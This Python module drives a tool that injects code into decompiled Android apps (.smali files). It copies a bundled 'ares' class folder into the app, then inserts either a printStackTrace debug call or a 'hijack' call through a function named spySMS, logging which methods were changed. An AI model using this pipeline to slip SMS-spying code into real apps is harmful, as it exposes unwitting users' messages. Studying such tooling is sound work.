import os
import sys
import time 
import fnmatch
import fileinput
import shutil
import progressbar
import helper
import inject

def copy_smali_class_files(dir_path):
	subdirs = os.listdir(dir_path)
	for subdir in subdirs:
		# Check that we are in the correct android dir (there is always a support dir)
		if (subdir == 'android'):
			if (os.path.exists(os.path.join(dir_path, subdir, 'support'))):
				# We copy the folder containing our .smali files
				helper.copy(os.path.join('smali', 'ares'), os.path.join(dir_path, subdir, 'ares'))
				return 
	
	copy_smali_class_files(os.path.dirname(dir_path))

def processed_file_info(file_name, code_to_inject, file_metadata):
	edited_meth_number = 0
	
	with open('./logs/' + file_name + '_injection-log.txt', 'w') as file:	
		for method in file_metadata:
				if (code_to_inject in method[5]):
					file.write(method[0] + '->' + method[1] + '\n')
					edited_meth_number += 1
				
	print('::INFO  {0} is injected into {1}/{2} methods' .format(code_to_inject, edited_meth_number, len(file_metadata))) 
	print('::INFO  logfile created at {0} \n'.format(os.path.abspath(file.name))) 
	
def processed_dir_info(dir_name, code_to_inject, my_metadata):
	meth_number = 0
	edited_meth_number = 0
	
	with open('./logs/' + dir_name + '_injection-log.txt', 'w') as file:
		for key, value in my_metadata.items():
			for method in value:
				meth_number += 1
				if (code_to_inject in method[5]):
					file.write(method[0] + '->' + method[1] + '\n')
					edited_meth_number += 1
				
	print('::INFO  {0} is injected into {1}/{2} methods' .format(code_to_inject, edited_meth_number, meth_number)) 
	print('::INFO  logfile created at {0} \n'.format(os.path.abspath(file.name)))  
			
def process_file(file_path, file_metadata, code_to_inject, keywords=None):
		
		if ('printStackTrace()V' == code_to_inject):
			if (keywords is None):
				inject.printStackTrace(file_path, file_metadata)
			else:
				inject.printStackTrace(file_path, file_metadata, keywords)
		
		elif ('hijack(Landroid/content/Context;)V' == code_to_inject):	
			if (keywords is None):
				inject.spySMS(file_path, file_metadata, code_to_inject)
			else:
				inject.spySMS(file_path, file_metadata, code_to_inject, keywords)
		
def process_dir(dir_path, my_metadata, code_to_inject, keywords=None):
	'''
	Edit the methods of the .smali files inside of a root folder.
	
	:param 	root_path:	path of the root folder file
	:param 	my_tag:	debug tag to use in logcat
	:param 	metadata:	dictionary containing the metadata of the methods inside 
	of a root folder
	:type		file_path:	str
	:type		my_tag:	str
	:type		metadata:	dict
	'''	
	i = 0
	
	exclude = os.path.join('android', 'ares')
	
	pbar = progressbar.ProgressBar(widgets=	[	
											'::INFO  Processing: ', 
											progressbar.Counter(), ' files ',
											progressbar.Bar(marker='#', left='[', right=']'), ' ',
											progressbar.Percentage(), ' ',
											progressbar.AdaptiveETA()
											], 
											maxval=(len(my_metadata)))	
		
	pbar.start()
	
	for root, dirs, files in os.walk(dir_path):		
		for file in fnmatch.filter(files, '*.smali'):
			pbar.update(i)
			file_path = os.path.join(root, file)
			
			# We skip the ares directory 
			if (exclude in file_path):
				continue
				
			else:
				if(keywords is None):
					process_file(file_path, my_metadata[file_path], code_to_inject)
				else:
					process_file(file_path, my_metadata[file_path], code_to_inject, keywords)
			
				i += 1
				
	pbar.finish()	
